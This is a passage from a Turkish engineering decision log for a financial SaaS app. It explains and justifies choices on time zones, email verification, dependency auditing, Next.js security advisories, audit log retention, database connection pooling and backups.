kalıyordu. Sunucu UTC+3 ise gece yarısı civarındaki kayıtlar listede **bir gün kaymış**
görünüyordu.

Finansal bir üründe bunun bedeli görüntü hatası değildir: bir işlemin hangi **güne**, dolayısıyla
hangi **döneme** düştüğü raporlamanın doğrudan girdisidir.

### Karar: referans `Tenant.timeZone`

Kullanıcının tarayıcısı referans **alınmaz**: aynı tenant'ın iki üyesi farklı şehirlerdeyse aynı
raporun farklı çıkması, çözdüğü sorundan büyük bir sorun yaratırdı.

"Her şey UTC, gösterim de UTC" alternatifi daha basitti ama Türkiye'de UTC+3 ile çalışan bir ekip
için gece 01:00'de girilen kayıt UTC'de "dün" olur — kullanıcıya "benim girdiğim tarih bu değildi"
dedirtir.

### Karar: `occurredAt` bir AN olarak kalır

`@db.Date`'e çevirmek geri dönüşü olmayan bir migration'dır ve ileride saatli kayıt (ör. tahsilat
anı, Epic 15) gerektiğinde yolu kapatır. Gün hesabı, saklanan **anın** tenant saat diliminde
yorumlanmasıyla yapılır.

### Mevcut kayıtlar dönüştürülmedi

Varsayılan `Europe/Istanbul`; bugüne kadarki tüm kayıtlar tek saat diliminde girildiği için bu
varsayılan **geçmişi de doğru yorumlar**. Migration mevcut satırlara dokunmaz.

### Tek yardımcı modül

`src/lib/time/tenant-time.ts` — `formatDateInTimeZone()`, `todayInTimeZone()`,
`isValidTimeZone()`, `resolveTenantTimeZone()`. Ekranlar tarih aritmetiğini elle yapmaz.

`timeZone`, `ActiveTenant` tipine eklendi: gün/dönem hesabı yapan her ekran zaten aktif tenant'ı
çözüyor, dolayısıyla ek sorgu yok ve referansın **unutulması** zorlaşıyor.

**Bağımlılık eklenmedi.** `date-fns-tz`/`luxon` yerine platformun `Intl` API'si; IANA veritabanı
zaten Node'un içinde. Saat dilimi doğrulaması da elle tutulan bir allowlist değil, `Intl`'e
sorarak yapılıyor — liste yıl içinde değişir ve kopyası bir sonraki tzdata güncellemesinde yanlış
olurdu.

**Okuma tarafında geçersiz değer varsayılana düşer, yazma tarafında reddedilir.** DB'deki değer
teoride geçersiz olabilir; o durumda `Intl` fırlatır ve tüm liste sayfası çökerdi — bir ayar
yüzünden veriye erişimin tamamen kaybolması kabul edilemez.

### Kalan risk / kapsam dışı

- **Ayar ekranı yok.** `Tenant.timeZone` şemada ve okuma yolunda var, ama **değiştirilebilir bir
  arayüzü yok** — tenant ayarları ekranı #86'nın konusudur. Bugün değer yalnızca varsayılandır.
- **Rapor dönem sınırları hâlâ UTC.** `src/lib/finance/aggregation.ts` ay başı/sonu sınırlarını
  `Date.UTC` ile kuruyor. Bu PR işlem listesi ve form varsayılanını hizaladı; raporlama
  tarafının aynı referansa taşınması ayrı bir adımdır ve Epic 7 ekranlarıyla birlikte ele
  alınmalıdır.
- **Dashboard ve borç/alacak listelerindeki tarih gösterimi** hâlâ `toISOString().slice(0,10)`
  kullanıyor; aynı sebeple ayrı adıma bırakıldı.

## E-posta doğrulama (Issue #190)

`User.emailVerified` şemada vardı ama **hiçbir yerde yazılmıyor ve okunmuyordu**. Kullanıcı
yanlış yazdığı bir e-postayla kayıt olabiliyordu; şifre sıfırlama akışı o hesaba sonsuza dek
erişilemez hâle geliyor ve destek yükü doğuruyordu. Sahte hesap üretimi de serbestti.

### Token deseni: `PasswordResetToken` ile birebir aynı

`randomBytes(32)`, DB'de yalnız SHA-256 hash'i, `expiresAt`, tek kullanımlık, tüketim **tek
atomik `updateMany`** ile (invariant #6). Yeni bir desen icat edilmedi.

**Neden ayrı bir model** (`PasswordResetToken`'ı yeniden kullanmak yerine): iki akışın ömürleri
ve iptal kuralları farklıdır — sıfırlama 30 dakika, doğrulama **24 saat**. Tek modele
sıkıştırmak "bu token hangi akışa ait" ayrımını bir `type` kolonuyla çözmeyi ve **her sorguya o
filtreyi eklemeyi** gerektirirdi; unutulduğu anda bir akışın token'ı diğerinde geçerli olurdu.

**Neden 24 saat:** doğrulama linki kullanıcının o an online olmasını gerektirmez ve e-posta
gecikmeleri saatler sürebilir. Aciliyet farkı da var — sızmış bir doğrulama token'ı en fazla
"e-posta doğrulandı" der, **hesabı devralmaz**.

### Doğrulanmamış hesap ne yapabilir?

**Giriş yapabilir ve kendi profilini görebilir; ama çalışma alanı oluşturamaz ve davet kabul
edemez** (403).

Doğrulama, hesabın sahibine gerçekten ulaşılabildiğini kanıtlar; **para ve ekip verisi ancak o
noktadan sonra** devreye girmelidir. Girişi tamamen engellemek **reddedildi**: e-posta
gecikmesinde (spam kutusu, kurumsal gateway) kullanıcıyı hesabından kilitlerdi.

Kontrol tek bir yerden okunur (`isEmailVerified()`) — iki ayrı yerde uygulandığı için
kopyalanan bir kontrol, birinin unutulmasıyla sonuçlanırdı.

### Enumeration duruşu korundu

`resend-verification` **daima aynı yanıtı** döner: e-posta kayıtlı olsun olmasın, hesap
doğrulanmış olsun olmasın. Aksi halde endpoint "şu e-posta kayıtlı mı" **ve** "doğrulanmış mı"
sorularının ücretsiz bir oracle'ı olurdu. Token hatası da ayrıştırılmaz — bulunamadı / süresi
doldu / zaten kullanıldı hepsi aynı `400` (invariant #7).

### POST, GET değil

`verify-email` bir `GET` olsaydı, **e-posta istemcisinin link ön-getirmesi** token'ı kullanıcı
tıklamadan tüketebilirdi (invariant #4, `/reset-password` ile aynı gerekçe). Sayfa token'ı
otomatik POST eder; `useRef` ile tek çağrı garantilenir çünkü React geliştirme modunda efektler
iki kez çalışır ve token tek kullanımlıktır.

### Gönderim best-effort

Doğrulama e-postası gönderilemese de **kayıt başarılı sayılır** (201). Aksi halde sağlayıcı
kesintisi, kullanıcının hiç hesap açamaması anlamına gelirdi; kullanıcı "tekrar gönder" ile
ilerleyebilir.

`credentialsChangedAt` **bumplanmaz**: e-posta doğrulamak bir credential değişikliği değildir ve
kullanıcıyı tüm oturumlarından düşürmek (#26/#186) burada yanlış olurdu.

### Kalan risk / kapsam dışı

- **Arayüzde kalıcı uyarı şeridi yok.** Issue "doğrulanmamış kullanıcıya arayüzde kalıcı bir
  uyarı şeridi ve tekrar gönder bağlantısı" istiyor; bu PR **API + doğrulama sayfasını**
  getiriyor, kabuğa şerit eklemiyor. Kullanıcı bugün 403 mesajıyla karşılaşıyor ve mesaj ne
  yapması gerektiğini söylüyor. Şerit ayrı bir adım.
- **E-posta adresi değiştirme akışı** kapsam dışı (issue'da yazılı); `/api/users/me` e-postayı
  bilerek değiştirmiyor.
- Gerçek sağlayıcıyla uçtan uca teslim **manuel doğrulanmadı** — #180'in Resend anahtarı hâlâ
  bekliyor. `EMAIL_PROVIDER=console` ile tüm akış test edildi.

## Bağımlılık güvenliği (Issue #189)

### `next-auth` tam sürüme sabitlendi

`^5.0.0-beta.32` → `5.0.0-beta.32`. Kütüphane **beta** sürümde ve `^` ile açık bırakılması, bir
`npm install`'ın beta'nın yeni bir sürümünü çekip **auth davranışını sessizce değiştirmesi**
anlamına geliyordu.

Bu repo'nun session revocation duruşu Auth.js'in **iç davranışına** dayanıyor: `jwt`
callback'inde `null` dönüldüğünde session action'ın token'ı yeniden imzalamak yerine cookie'yi
temizlemesi (bkz. "Session Revocation"). Beta sürümler arasında bu değişebilir ve fark
edilmeden revocation devre dışı kalabilirdi. Finansal bir üründe auth katmanının kontrolsüz
güncellenmesi kabul edilebilir bir risk değil.

**Kabul edilen kalan risk:** sabitleme, güvenlik yamalarını da otomatik almamak demektir.
Bunun karşılığı Dependabot'un uyarı üretmesi ve güncellemenin **elle, testlerle** yapılmasıdır.

### Dependabot

`.github/dependabot.yml` — npm ve github-actions için haftalık. `next-auth`, `prisma` ve
`@prisma/client` **otomatik PR dışında** bırakıldı: üçü de sessizce güncellenmesi kabul
edilemeyecek katmanlar (auth davranışı, şema/migration uyumu).

Açık PR sayısı 5 ile sınırlı — sınırsız bırakmak, incelenmeyen PR'ların birikip hepsinin
görmezden gelinmesiyle sonuçlanır.

### `npm audit` CI job'ı — eşik `critical`

CI'da yedinci bir job var: `npm audit --omit=dev --audit-level=critical`. Eşiğin `high`
değil `critical` olması bilinçli bir karardır ve gerekçesi şudur.

#### Önce yanlış çıkan varsayım

"`prisma` CLI zinciri `devDependencies` altındadır, dolayısıyla `--omit=dev` onu eler"
varsayımı **yanlıştır**. `@prisma/client` — ki o bir **production** bağımlılığıdır —
`prisma`'yı `peerDependencies` içinde `"prisma": "*"` olarak ilan eder. npm bunu bir
**production kenarı** sayar; zincir `--omit=dev` ile kesilmez.

Ölçüldü, varsayılmadı:

```bash
npm audit --omit=dev --audit-level=high   # exit 1 - uc yuksek advisory raporlaniyor
```

```
deepmerge-ts  <8.0.0   Severity: high
  GHSA-ggr8-5vv4-36mx  (stack exhaustion on recursive object graphs)
  @prisma/config  -> depends on vulnerable deepmerge-ts
    prisma        -> depends on vulnerable @prisma/config
3 high severity vulnerabilities
```

`npm audit`'in tek önerisi `prisma@6.12.0` — 6.19.3'ten **kırıcı bir düşürme**.

#### Sonra ölçülen şey: bu paketler kod yolunda YOK

Ağaçta görünmek ile **çalıştırılan koda ulaşmak** aynı şey değildir. Ölçüm (komutlar
tekrarlanabilir, `npm run build` sonrası koşulur):

```bash
# 1) Deploy edilen cikti - sifir eslesme beklenir
grep -rl "deepmerge\|@prisma/config" .next/server .next/static | wc -l          # 0

# 2) Prisma client'in CALISMA ZAMANI paketi
grep -c "deepmerge" node_modules/@prisma/client/runtime/client.js                # 0
grep -c "@prisma/config" node_modules/@prisma/client/runtime/client.js           # 1 (asagiya bakin)

# 3) Gercek bir import/require var mi
grep -rno 'require("deepmerge-ts")\|require("@prisma/config")\|from "deepmerge-ts"\|from "@prisma/config"' \
  node_modules/@prisma/client/ | wc -l                                          # 0
```

İkinci komuttaki **tek** eşleşme bir import değil, pakete gömülü bir package.json metadata
dizesidir: `dependencies:{"@prisma/config":"workspace:*",...}`. Yani `deepmerge-ts` ve
`@prisma/config` **çalışma zamanında hiç çağrılmıyor**; `prisma` zinciri yalnızca CLI
(migration/generate) yolunda kullanılıyor ve o yol deploy edilen sunucu paketine girmiyor.

#### Bu yüzden eşik `critical`

Yakalanması gereken şey **deploy edilen koda ULAŞAN** açıktır. Ağaçta duran ama çağrılmayan bir
paket için CI'ı kalıcı kırmızı tutmanın sonu bellidir: bir süre sonra herkes audit çıktısını
görmezden gelir ve araç, gerçek bir bulguyu bildirdiği gün de susmuş sayılır. Kalıcı kırmızı bir
kapı, kapı değildir.

**Görünürlük kaybedilmiyor.** Ölçüldü: `--audit-level` **yalnızca çıkış kodunu** değiştirir,
çıktıyı değil. Job her koşuda üç `high` bulgunun tamamını basar ve yine de yeşil kalır — bu
yüzden ayrı bir "raporlama" adımına gerek duyulmadı.

`--omit=dev` korunuyor: geliştirme araçlarındaki bir açık deploy edilen koda ulaşmaz.

Job `npm ci` **çalıştırmaz**: `npm audit` `package-lock.json`'dan çalışır ve
`node_modules`'a ihtiyaç duymaz (doğrulandı — yalnızca `package.json` + lock dosyası
kopyalanmış boş bir dizinde aynı raporu üretti). Kurulum eklemek işi dakikalarca uzatır,
taramaya hiçbir şey katmaz.

#### KABUL EDİLEN KALAN RİSK

Eşik `critical` olduğu için, ileride kod yolunda **gerçekten bulunan** yüksek seviyeli bir
açık da **CI'ı kırmayacaktır.** Bu, bu kararın bedelidir ve küçümsenmiyor.

Karşı önlemler — üçü birlikte, biri eksikse risk kabul edilebilir değildir:

1. **Takip issue'su zorunludur ve açık tutulur** — **#227**. Üç advisory'nin durumu orada izlenir; Prisma
   `deepmerge-ts@^8`'e geçtiği anda eşik **`high`'a çekilir**.
2. **Audit çıktısı her sürümde okunur.** Job yeşil olsa da çıktısı bilgi taşır; "yeşil" onu
   okumamanın gerekçesi değildir.
3. **Bağımlılık taraması tek başına yetmez** — bu, ayrı ve daha genel bir karar olarak zaten
   yazılı (bkz. "Güvenlik kararı: bağımlılık taraması tek başına yetmez"). Next.js'in iki
   Critical RCE advisory'si `npm audit` tarafından **hiç bildirilmemişti**; framework
   advisory'leri ayrıca takip edilir.

## Modül seed mekanizması (Issue #154)

Bir modül bir tenant'ta **ilk kez** açıldığında, kullanılabilir olması için gereken varsayılan
verinin kurulması. Kapatıp tekrar açmak veri **kopyalamamalıdır**.

### Seed, modülü açan transaction'ın İÇİNDE çalışır

`ModuleSeed` imzası `prisma` değil **`tx`** alır. Ayrı bir bağlantıda çalıştırmak, seed başarılı
olup modülün açılmaması (ya da tersi) durumunu mümkün kılardı — ikisi **tek bir atomik
karardır**.

`seededAt` **aynı yazmada** doldurulur. Ayrı bir yazmada doldurmak, arada düşen bir istekte
**çift seed** üretirdi.

### Eşzamanlılık

Tüm işlem zaten `runSerializable()` içinde (bağımlılık kuralı nedeniyle, #151). `seededAt`
okuması ve seed yazması aynı serializable transaction'da olduğu için, eşzamanlı iki "aç"
isteğinden biri serialization hatası alıp yeniden dener ve ikinci denemede `seededAt` dolu
bulur. `integration/module-seed.spec.ts` bunu kanıtlıyor.

**İkinci savunma katmanı:** seed fonksiyonları kendi başlarına da idempotent yazılır — unique
constraint'lere dayanır, "önce say sonra ekle" **yapmaz**.

### Seed başarısız olursa

Transaction **rollback** olur: modül açılmaz, yarım veri kalmaz. Servis `503` döner — **500
değil** (kullanıcı bir sunucu çökmesi değil, tamamlanmamış bir işlem görmeli; durum tutarlı
olduğu için tekrar denemek mantıklı) ve **409 değil** (bu bir iş kuralı ihlali değil, kurulum
hatası).

**Bilinen sınır:** kalıcı olarak başarısız olan bir seed her denemede aynı `503`'ü döndürür;
gerçek neden yalnızca sunucu logundadır.

### Kapatma seed'i geri almaz

`seededAt` bir kez dolduktan sonra hiç temizlenmez ve kapatma veri silmez.

### Bugün hiçbir modülde seed TANIMLI DEĞİL

Mekanizma hazır, ama kurulacak veri henüz yok: CRM'in aşama şablonu kendi modellerini bekliyor
(#157), tahsilatın varsayılanı yok. Uydurma bir seed yazmak, var olmayan tablolara referans
veren ve derlenmeyen bir katalog üretirdi — `permissions` ve `nav` alanlarının başlangıçta boş
bırakılmasıyla aynı gerekçe.

Bu yüzden `setModuleEnabled()` bir `seeds` **enjeksiyon seam'i** taşır: mekanizmayı gerçek bir
domain seed'i olmadan test edebilmek için. Katalogu test içinde mutasyona uğratmak reddedildi —
paylaşılan global durumu değiştirir ve testler arası sızıntı üretirdi. Bu bir **bypass
değildir**: seed'i atlamaz, yalnızca kaynağını değiştirir; `seededAt` mantığı, transaction
sınırı ve rollback davranışı aynen çalışır (`emailSender` ve `probeDatabase` seam'leriyle aynı
desen).

### Kapsam dışı

- Var olan tenant'lara toplu seed basan CLI/migration script'i.
- Seed'in kullanıcı tarafından "sıfırla" ile yeniden çalıştırılması.

## Güvenlik kararı: bağımlılık taraması tek başına yetmez

Next.js **16.3.3**, iki **Critical** açığı kapatan bir yama sürümüdür:

| Advisory | CVSS | Etkilenen | Ne |
| --- | --- | --- | --- |
| `GHSA-p293-qw3h-jr36` | 9.0 | `>= 16.0 < 16.3.3` | Windows barındırmada path traversal → kimliksiz RCE |
| `GHSA-2xp9-vwfh-vxw4` | 9.5 | `< 16.3.3` | Image Optimization AVIF → `sharp`/`libheif` → kimliksiz RCE |

Bu repo `16.3.0`'daydı, yani **her iki aralığın da içindeydi**.

### Kritik ders: `npm audit` bunları BİLDİRMEDİ

Yükseltme anında `npm audit` çalıştırıldı ve çıktısında `next` **hiç geçmiyordu** — yalnızca
`prisma`/`@prisma/config`/`deepmerge-ts` bulguları vardı. Sebep: her iki advisory de o an
GitHub **global advisory veritabanında yoktu** (`gh api advisories/GHSA-...` → `404`); yalnızca
`vercel/next.js` deposunun kendi advisory sayfalarında yayınlanmışlardı. npm'in danışma
veritabanı da onları henüz almamıştı.

Sonuç: **tarama aracının sessizliği, güvende olduğumuz anlamına gelmez.** CVSS 9.0 ve 9.5
seviyesinde iki RCE, `npm audit`'e göre yoktu.

**Karar:** bağımlılık taraması (`npm audit` + Dependabot) gerekli ama **yeterli değildir**.
Framework advisory'leri **ayrıca** takip edilir:

- `next`, `next-auth` ve `prisma` için upstream release notları/advisory sayfaları düzenli
  okunur; Dependabot'un sessizliği kanıt sayılmaz.
- Bir yama sürümünün release notunda "security fixes" geçiyorsa, o sürüm **rutin bir güncelleme
  gibi kuyruğa alınmaz**.
- Lockstep sürümlenen paketler (`next` + `eslint-config-next`) **birlikte** yükseltilir; ayrı
  bırakmak, lint yapılandırmasının yamalı, çalışma zamanının yamasız kalmasına yol açar — bu
  olayda Dependabot tam olarak bunu önerdi (yalnızca `eslint-config-next` için PR açtı).

### İkinci advisory bize dokunuyor muydu?

Ölçüldü, varsayılmadı:

- **`next/image` uygulamada hiç kullanılmıyor** — `src/` içinde tek bir `<Image>` veya
  `next/image` import'u yok (`src/proxy.ts`'teki iki referans yalnızca matcher yorumu).
- **`images.formats` varsayılanı `['image/webp']`** (doğrulandı:
  `node_modules/next/dist/shared/lib/image-config.js`). AVIF **opt-in**'dir ve
  `next.config.ts`'te `images` bloğu **hiç yok** — yani AVIF üretimi kapalı.
- **`remotePatterns` boş** (varsayılan): `/_next/image` uzak URL getiremez.
- **Kullanıcı dosya yüklemesi yok**; `public/` yalnızca beş statik SVG içeriyor.
- Ancak **`sharp@0.35.3` ağaçta var** (`next`'in geçişli bağımlılığı) ve `/_next/image`
  endpoint'i, kodda `<Image>` kullanılmasa da bir Next uygulamasında **mevcuttur**.

**Değerlendirme:** ikinci advisory'ye maruziyetimiz düşük görünüyor, ama **sıfır olduğu
iddia edilmiyor** — endpoint var ve zafiyetli kütüphane ağaçta. Birinci advisory (Windows path
traversal) ise geliştirme makineleri Windows olduğu için doğrudan ilgilidir.

**Kalan risk:** production hedefi henüz belirlenmedi (#185/#187 açık). Hedef Windows tabanlı bir
barındırma olursa birinci advisory sınıfı yeniden değerlendirilmelidir.
## AuditLog saklama ve arşivleme (Issue #188)

`AuditLog` her state değiştiren işlemde bir satır yazıyor ve **hiçbir zaman silinmiyordu**. Bir
yıl içinde veritabanının en büyük tablosu o olurdu; `@@index([createdAt])` ve `@@index([action])`
de onunla birlikte büyürdü. Ayrıca "kişisel veriyi ne kadar süre tutuyorsunuz?" sorusunun bir
cevabı yoktu.

### Saklama süresi: 12 ay sıcak, öncesi arşiv

Audit log'un iki tüketicisi var: **güvenlik incelemesi** (pratikte haftalar, en fazla aylar
geriye bakar) ve **uyuşmazlık çözümü** (finansal bir üründe bir işlemin kim tarafından
değiştirildiği bir mali yıl boyunca sorulabilir). 12 ay ikisini de karşılar ve **tam bir mali
dönemi** kapsar.

**Daha kısa (90 gün) reddedildi:** yıl sonu kapanışında geçmiş bir çeyreğin kayıtları kaybolurdu.
**Daha uzun (7 yıl) reddedildi:** yasal saklama yükümlülüğü audit log'a değil **finansal
kayıtlara** aittir; audit log onların yerine geçmez. Kişisel veriyi gereğinden uzun tutmak da
bir yükümlülüktür, avantaj değil.

"12 ay" verinin ömrü değil, **sıcak veritabanında kalma süresidir** — süresi dolan kayıtlar
silinmeden önce arşivlenir.

### Önce arşiv, sonra silme

Süreç ikisinin arasında ölürse satırlar hâlâ veritabanındadır ve bir sonraki çalıştırma onları
**yeniden** arşivler: sonuç, arşivde yinelenen kayıtlardır. Ters sıra (önce sil, sonra arşivle)
**veri kaybı** üretirdi. Yinelenen arşiv kaydı geri dönülebilir bir sorundur; kaybolan denetim
kaydı değildir.

Arşiv **JSONL**'dir (satır başına bir JSON): tek dev bir dizinin aksine akış halinde okunabilir,
milyonlarca satır belleğe alınmadan işlenebilir. Dosya önce `.tmp` yazılıp sonra `rename`
edilir — `rename` aynı dosya sistemi içinde atomiktir; doğrudan hedefe yazarken süreç ölürse
geride **yarım bir arşiv** kalır ve o dosya "silinen satırların tam kaydı" sanılırdı.

### Partiler hâlinde, idempotent

Tek dev `DELETE` **atılmaz**: milyonlarca satırlık tek bir ifade tabloyu uzun süre kilitler,
WAL'ı şişirir ve replikasyon gecikmesi üretir — bakım işi üretimi durdurur hale gelirdi.

Cutoff **mutlak bir tarihtir** (satır sayısına veya önceki çalıştırmaya bağlı değil), bu yüzden
görev güvenle tekrarlanabilir ve yarıda kesilirse kaldığı yerden devam eder. İkinci çalıştırma
hiçbir şey silmez ve dosya bile üretmez.

Tek çalıştırmada azami parti sayısı sınırlıdır: ilk çalıştırma yılların birikmiş kaydını
bulabilir ve sınırsız bir döngü, zamanlanmış işin platform zaman aşımına takılıp **her seferinde
aynı yerde ölmesine** yol açardı. `hasMore` bir sonraki çalıştırmanın gerekli olduğunu söyler.

### Silme audit log'a YAZMAZ

Silme işlemi kendi `AuditLog` satırını üretseydi tablo hiçbir zaman tam boşalmaz ve görev **kendi
kendini besleyen** bir döngüye girerdi. Sonuç yalnızca sunucu loguna yazılır — bakım işinin
gerçekten çalıştığının tek görünür kanıtı budur.

`tenantId`/`actorUserId` **null** olan kayıtlar da politikaya tabidir: tenant'ı veya kullanıcısı
silinmiş kayıtlar (`onDelete: SetNull`) aksi halde sonsuza kadar birikirdi.

### Tetikleme: platformun zamanlanmış işi

`POST /api/maintenance/audit-retention`, `MAINTENANCE_SECRET` ile korunur. Uygulama içinde
kalıcı bir zamanlayıcı **kurulmaz**: `setInterval` serverless/çok instance'lı bir deployment'ta
ya hiç çalışmaz ya da her instance'ta ayrı ayrı çalışır.

**Oturum değil, paylaşılan anahtar:** zamanlanmış bir işin oturumu yoktur; ona bir kullanıcı
hesabı açmak, o hesabın çalınması hâlinde çok daha geniş bir yetki verirdi. Anahtar,
karşılaştırmada **sabit zamanlıdır** (`timingSafeEqual`, önce SHA-256 ile eşit uzunluğa
indirgenerek — farklı uzunlukta `timingSafeEqual` fırlatır ve fırlatmanın kendisi "uzunluk
tutmadı" bilgisini sızdırırdı).

**Anahtar yanlışsa da yapılandırılmamışsa da yanıt `404`'tür** — `401`/`403` değil. Kimliksiz bir
çağıran, bu adreste bir bakım endpoint'i olup olmadığını ve yapılandırılmış olup olmadığını
ayırt edemez. Yanlış yapılandırma yine de **görünürdür**: zamanlanmış iş 404 alır ve platformun
cron kayıtlarında başarısız görünür.

**Yanıt sayıları içerir, satırları değil:** silinen audit kayıtları kişisel veri taşır; onları
HTTP yanıtına koymak arşiv dosyasının erişim kontrolünü anlamsız kılardı.

### Kalan risk / kapsam dışı

- **Arşiv bugün YEREL DİSKE yazılıyor.** Soğuk depolamaya taşımak **#185**'in konusudur ve o
  issue veritabanı sağlayıcısı kararına bağlı olduğu için açık. `AUDIT_ARCHIVE_DIR` ile hedef
  değiştirilebilir; production'da yedekleme deposuyla aynı yere işaret etmelidir.
- **Zamanlanmış işin kendisi kurulmadı** — `.github/workflows` veya platform cron'u tanımlamak
  bir deployment adımıdır ve `MAINTENANCE_SECRET`'ın ortama konmasını gerektirir.
- **Doğru anahtarla 200 alındığı manuel doğrulanmadı**: `MAINTENANCE_SECRET` test ortamında
  tanımlı değil, bu yüzden otomatik testler "özellik kapalı" (404) davranışını doğrular.

## Veritabanı bağlantı yönetimi (Issue #187)

Sağlayıcı **Neon** olarak karara bağlandı. Neon iki ayrı endpoint sunar ve bu ikisi
**farklı işler için** vardır; ikisini karıştırmak production'da iki ayrı şekilde canını yakar.

### İki adres, iki iş

| Değişken | Ne | Kim kullanır |
| --- | --- | --- |
| `DATABASE_URL` | **Doğrudan** bağlantı | `prisma migrate`, `prisma generate`, `prisma studio` |
| `DATABASE_POOL_URL` | **Havuzlanmış** (PgBouncer) bağlantı — Neon'da host'unda `-pooler` geçen endpoint | Uygulama çalışma zamanı (`src/lib/prisma.ts`) |

`DATABASE_POOL_URL` **opsiyoneldir**. Tanımsızsa uygulama `DATABASE_URL`'e düşer ve davranış
bugünküyle **birebir** aynı kalır — lokal geliştirme ve CI hiç etkilenmez.

### Neden bu ayrım gerekli

Her istekte session revocation için bir `User` sorgusu atılıyor (bilinçli karar, bkz. "Session
Revocation"). Bu, uygulamanın en sıcak sorgusudur. Serverless bir deployment'ta her instance
**kendi Prisma havuzunu** açar; Prisma'nın varsayılanı `num_cpus * 2 + 1` bağlantıdır ve bu
sayı instance sayısıyla **çarpılır**. Postgres'in `max_connections`'ı bu çarpımı karşılamaz:
trafik arttığında uygulama `too many connections` ile **aniden** çöker. Bu, yavaşça kötüleşen
değil, bir eşiği geçince bir anda oluşan bir arızadır — bu yüzden trafik gelmeden yapılandırılır.

### MIGRATION'LAR POOLER ÜZERİNDEN ÇALIŞTIRILMAZ

Bu, bu bölümün en önemli cümlesidir. Neon'un pooler'ı **transaction modunda** çalışır:
prepared statement'ları ve oturum düzeyi durumu desteklemez. Prisma Migrate ise bir **advisory
lock** alır ve DDL'i tek bir oturum boyunca yürütür. Pooler üzerinden bu davranış bozulur;
migration **yarıda kalabilir** ve şema tutarsız bir durumda bırakılabilir.

Bu yüzden `prisma/schema.prisma`'daki `datasource` bloğu **bilerek** `DATABASE_URL`'e bağlı
kalır. Havuzlanmış adres şemaya hiç girmez; yalnızca çalışma zamanında `PrismaClient`
yapıcısına `datasourceUrl` olarak verilir.

**Reddedilen alternatif — Prisma'nın `directUrl` alanı.** Kanonik çözüm gibi görünür, ama
`url`'i `DATABASE_POOL_URL`'e bağlamayı gerektirir. O değişken tanımsız olduğunda — lokal
geliştirme, CI, `docker compose` ile ayağa kalkan her kurulum — Prisma **hiç** çalışmaz;
`env()` içinde geri düşüş ifade edilemez. Programatik çözüm aynı ayrımı sağlar ve havuz
yapılandırılmamışken hiçbir şeyi değiştirmez.

Bu kural bir yorumla değil, bir testle korunuyor: `integration/db-connection.spec.ts` şema
dosyasını okur ve `datasource` bloğunda `DATABASE_POOL_URL` geçerse **kırmızıya döner**.

### Uygulama başına `connection_limit`

Havuzlanmış adrese, operatör kendisi belirtmemişse `connection_limit=5` eklenir.

Pooler'daki limit **sunucu genelindedir**; istemci tarafında sınır koymazsak tek bir instance
havuzun tamamını tüketip diğer instance'ları aç bırakabilir. 5, Neon'un pooled endpoint'inin
karşıladığı istemci sayısıyla serverless instance başına makul bir paydır.

**Operatörün açık tercihi ezilmez:** adreste zaten bir `connection_limit` varsa dokunulmaz.
Sessizce 20'yi 5'e düşürmek, yapılandırmayı yalancı hale getirirdi.

### Ölçüm: 50 eşzamanlı kimlikli istek

Kabul kriteri varsayımla değil, ölçümle kapatıldı. Sonuç ve yöntem PR'da; özet: 50 eşzamanlı
kimlikli `GET /api/users/me` isteği (her biri session revocation sorgusunu tetikler) **sıfır
hata** ile tamamlandı, `too many connections` (P1001) veya havuz zaman aşımı (P2024)
görülmedi.

Ölçüm **lokal PostgreSQL'e** karşı yapıldı; Neon'un pooler'ı henüz hesap bağlı olmadığı için
devrede değildi. Yani ölçülen şey **Prisma'nın kendi havuz davranışıdır** — 50 eşzamanlı istek
sınırlı sayıda bağlantı üzerinden sıraya girer, yeni bağlantı açmaya çalışıp reddedilmez. Bu,
kabul kriterinin doğrulanabilir yarısıdır.

### Kalan risk / kapsam dışı

- **Neon pooler'ı gerçek trafikle doğrulanmadı.** `DATABASE_POOL_URL` production ortamına
  konduktan sonra aynı ölçüm oraya karşı tekrarlanmalıdır; bu, hesap erişimi gerektirdiği için
  bu PR'ın dışındadır.
- **`connection_limit=5` bir başlangıç değeridir**, ölçülmüş bir optimum değil. Doğru değer
  instance sayısına ve Neon planının bağlantı kotasına bağlıdır; ilk yük altında gözden
  geçirilmelidir.
- **Deployment hedefi hâlâ bağlayıcı değil.** Migration'ların hangi adımda ve hangi adresle
  koşacağı (`DATABASE_URL` ile, pooler'sız) `docs/deployment.md`'ye yazıldı, ama pipeline
  kurulmadı — `#185`'in konusu.
- **`jwt` callback sorgusu değiştirilmedi.** Issue açıkça bunu şart koşuyordu; bağlantı
  yönetimi o sorguyu ucuzlatmaz, yalnızca yükünü taşınabilir kılar.

## Yedekleme ve geri dönüş (Issue #185)

> **RPO = 24 saat. RTO = 4 saat.**
>
> Prosedür: `docs/runbook-restore.md` · Politika ve saklama süreleri: `docs/data-retention.md`

Ürün müşterinin **parasal** verisini tutuyor. Bu iki sayı yazılmadan yedekleme tasarımı
yapılamaz; "elimizde yedek var" bir politika değildir.

### Neden bu iki sayı

**RPO 24 saat** — en kötü durumda 24 saate kadar veri kaybını göze alıyoruz. Bu bir **tavandır**,
beklenen değer değil: birincil katman olan point-in-time recovery kaybı dakikalar seviyesinde
tutar. 24 saat, PITR'ın da kullanılamadığı senaryoyu (hesap kilitlenmesi, sağlayıcı kaybı)
karşılar.

**RTO 4 saat** — ölçülen `pg_restore` süresine göre çok geniştir ve öyle olması kasıtlıdır.
Ölçülen süre yalnızca geri yüklemedir; gerçek olayda kararın verilmesi, doğru yedeğin seçilmesi,
indirme, deployment geçişi ve doğrulama eklenir. Dar bir RTO yazmak, karşılanamayacak bir söz
vermek olurdu.

### İki katman, ve ikincisinin neden var olduğu

| Katman | Ne | Saklama |
| --- | --- | --- |
| **Birincil** | Neon otomatik yedek + **PITR** | En az 7 gün hedefleniyor |
| **İkincil** | Haftalık **taşınabilir** `pg_dump -Fc`, ayrı nesne deposunda | **8 hafta** |

Sağlayıcının kendi yedeği, **hesabın kilitlenmesi** ya da sağlayıcının kendisinin kaybedilmesi
durumunda erişilemez; snapshot formatı da sağlayıcıya özeldir ve başka bir Postgres'e taşınamaz.
`pg_dump -Fc` çıktısı herhangi bir Postgres 16'ya `pg_restore` ile yüklenir. İkinci katman,
**sağlayıcı kilidini kıran tek şeydir** (#95'ten devralınan kısıt) ve birincinin *yerine* değil
*yanına* gelir.

**8 hafta neden:** bir veri bozulması her zaman aynı gün fark edilmez. Yalnızca son dökümü
tutmak, "bozulma zaten dökümün içinde" senaryosunda hiçbir işe yaramaz.

**Yedekleme anahtarı yalnızca YAZMA yetkilidir.** Sunucusu ele geçirilen bir sistemde o anahtarla
yedekler okunamaz ve silinemez. Fidye yazılımı senaryosunda yedekleri koruyan tek şey budur.

